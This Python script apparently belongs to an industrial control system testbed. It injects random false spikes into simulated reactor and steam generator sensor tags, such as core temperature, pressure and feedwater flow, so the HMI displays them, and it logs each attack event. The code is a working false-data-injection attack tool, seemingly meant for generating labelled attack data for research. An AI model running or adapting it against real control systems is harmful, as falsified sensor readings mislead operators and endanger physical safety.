#!/usr/bin/env python3
"""
AttackerSensorSpike.py

Injects brief random spikes into selected sensor tags.

Behavior
- For a chosen duration, each tag has a probability per second of entering a short
  "spike window". While spiking, we repeatedly write the spike value at a fast rate
  so the simulator/HMI sees it.
- Spike value can be absolute, multiply (current * factor), or offset (current + delta).

Usage
    python AttackerSensorSpike.py
"""

import os
import time
import json
import logging
from datetime import datetime, timedelta

from AttackerBase import AttackerBase
from Configs import TAG

# Sensible defaults (you can change these or choose interactively on start)
DEFAULT_TARGETS = [
    TAG.TAG_CORE_TEMP_OUT_VALUE,
    TAG.TAG_CORE_PRESSURE_VALUE,
    TAG.TAG_CORE_FLOW_VALUE,
    TAG.TAG_SG_STEAM_PRESSURE_VALUE,
    TAG.TAG_SG_LEVEL_VALUE,
    TAG.TAG_SG_FEEDWATER_FLOW_VALUE,
]

class AttackerSensorSpike(AttackerBase):
    def __init__(self):
        super().__init__('attacker_sensor_spike')

        # dedicated per-run log file (in addition to AttackerBase summary)
        self.log_dir = os.path.join('.', 'logs', 'attack-logs')
        os.makedirs(self.log_dir, exist_ok=True)
        self.run_log = self.setup_logger(
            'sensor_spike_run',
            logging.Formatter('%(message)s'),
            file_dir=self.log_dir,
            file_ext=f'.txt'
        )
        self.run_log.info("timestamp,event,tag,mode,value,notes")

    # ---------- helpers ----------
    def _prompt(self, prompt, default=None):
        try:
            val = input(prompt)
        except KeyboardInterrupt:
            val = ''
        if val is None or val == '':
            return default
        return val

    def _parse_float(self, s, default):
        try:
            return float(s)
        except Exception:
            return default

    def _receive_safe(self, tag):
        """Try to read a tag using _receive, fall back to _get."""
        try:
            v = self._receive(tag)
        except Exception:
            try:
                v = self._get(tag)
            except Exception:
                v = None
        return v

    # ---------- core ----------
    def _logic(self):
        # 1) Select targets
        print("\nAvailable default targets (press Enter to accept):")
        for i, t in enumerate(DEFAULT_TARGETS):
            print(f"  {i+1}) {t}")
        raw = self._prompt("Enter comma-separated tag names (or press Enter for defaults): ", "")
        if not raw:
            targets = DEFAULT_TARGETS.copy()
        else:
            targets = [x.strip() for x in raw.split(",") if x.strip()]

        # validate/expand shorthands if user typed fragments
        valid = []
        for t in targets:
            if t in TAG.TAG_LIST:
                valid.append(t)
            else:
                matches = [k for k in TAG.TAG_LIST if t in k]
                if len(matches) == 1:
                    valid.append(matches[0])
                elif len(matches) > 1:
                    self.report(f"Ambiguous '{t}', matches {matches} — skipping", logging.WARNING)
                else:
                    self.report(f"Unknown tag '{t}' — skipping", logging.WARNING)

        if not valid:
            self.report("No valid targets — aborting.")
            return

        # 2) Duration
        dur = self._parse_float(self._prompt("Test duration seconds (default 60): ", "60"), 60.0)

        # 3) Spike mode
        mode = str(self._prompt("Spike mode: [absolute|multiply|offset] (default absolute): ", "absolute")).lower()
        if mode not in ("absolute", "multiply", "offset"):
            mode = "absolute"

        # 4) Mode params
        if mode == "absolute":
            abs_val_in = self._prompt("Absolute value to force (default: high outlier e.g., 999.0): ", "999.0")
            abs_val = self._parse_float(abs_val_in, 999.0)
            params = {"abs": abs_val}
        elif mode == "multiply":
            fac_in = self._prompt("Multiply factor (default 1.3): ", "1.3")
            fac = self._parse_float(fac_in, 1.3)
            params = {"factor": fac}
        else:  # offset
            off_in = self._prompt("Offset delta (default +10.0): ", "10.0")
            off = self._parse_float(off_in, 10.0)
            params = {"offset": off}

        # 5) Spike frequency & length
        prob_in = self._prompt("Per-tag spike probability per second (default 0.15): ", "0.15")
        spike_prob_per_sec = self._parse_float(prob_in, 0.15)

        len_in = self._prompt("Spike length milliseconds (default 400): ", "400")
        spike_len_ms = float(int(self._parse_float(len_in, 400)))

        # 6) Write cadence during spike
        cad_in = self._prompt("Write interval during spike ms (default 50): ", "50")
        write_interval_ms = float(int(self._parse_float(cad_in, 50)))

        # summary
        self.report("=== Random Sensor Spike Test ===", logging.INFO)
        self.report(f"Targets: {valid}")
        self.report(f"Duration: {dur}s, Mode: {mode}, Params: {params}")
        self.report(f"Spike prob/sec: {spike_prob_per_sec}, Spike len: {spike_len_ms} ms, Write every: {write_interval_ms} ms")

        start = datetime.now()
        self.attack_history.info(
            f"random-spike,{start.timestamp()},{(start + timedelta(seconds=dur)).timestamp()},{start},{start + timedelta(seconds=dur)},{self.MAC},{self.IP},random-sensor-spike"
        )
        self.run_log.info(f"{start.isoformat()},start,,{mode},{json.dumps(params)},targets={json.dumps(valid)}")

        # Per-tag state
        tag_state = {t: {"spiking": False, "until": 0.0, "last_write": 0.0} for t in valid}

        end_ts = start.timestamp() + dur
        now = time.time()
        last_tick = now

        try:
            while time.time() < end_ts:
                now = time.time()
                dt = max(0.0, now - last_tick)
                last_tick = now

                # Per-tag: possibly start a spike
                for t in valid:
                    st = tag_state[t]

                    # Check if current spike ended
                    if st["spiking"] and now >= st["until"]:
                        st["spiking"] = False
                        self.run_log.info(f"{datetime.now().isoformat()},end_spike,{t},{mode},,")

                    # Maybe start new spike
                    if not st["spiking"]:
                        # convert per-second probability to this loop's chance
                        # assume loop ~20ms; use dt to scale: p_dt ≈ p_per_sec * dt
                        p_dt = spike_prob_per_sec * dt
                        if p_dt > 0.9:  # clamp extreme
                            p_dt = 0.9
                        import random
                        if random.random() < p_dt:
                            st["spiking"] = True
                            st["until"] = now + (spike_len_ms / 1000.0)
                            st["last_write"] = 0.0
                            self.run_log.info(f"{datetime.now().isoformat()},start_spike,{t},{mode},,")

                    # If spiking, write at cadence
                    if st["spiking"] and (now - st["last_write"]) * 1000.0 >= write_interval_ms:
                        cur = self._receive_safe(t)
                        if cur is None:
                            cur = 0.0

                        # compute spike value
                        if mode == "absolute":
                            spike_val = params["abs"]
                        elif mode == "multiply":
                            spike_val = float(cur) * params["factor"]
                        else:  # offset
                            spike_val = float(cur) + params["offset"]

                        # Try to keep numbers sane for 0..1 normalized tags if we can infer them
                        # (only a soft clamp for better visuals; comment out if not desired)
                        if "flow" in t or "valve" in t:
                            spike_val = max(0.0, min(1.5, spike_val))  # allow a bit overrange

                        try:
                            self._set(t, spike_val)
                            self.run_log.info(f"{datetime.now().isoformat()},write,{t},{mode},{spike_val},cur={cur}")
                        except Exception as e:
                            self.report(f"Write failed for {t}: {e}", logging.ERROR)

                        st["last_write"] = now

                time.sleep(0.02)  # ~50 Hz loop
        except KeyboardInterrupt:
            self.report("Interrupted by user", logging.WARNING)

        end = datetime.now()
        self.run_log.info(f"{end.isoformat()},finish,,{mode},{json.dumps(params)},")
        self.report("Random Sensor Spike test finished.", logging.INFO)

        # Exit after one run
        return


if __name__ == "__main__":
    attacker = AttackerSensorSpike()
    attacker.start()
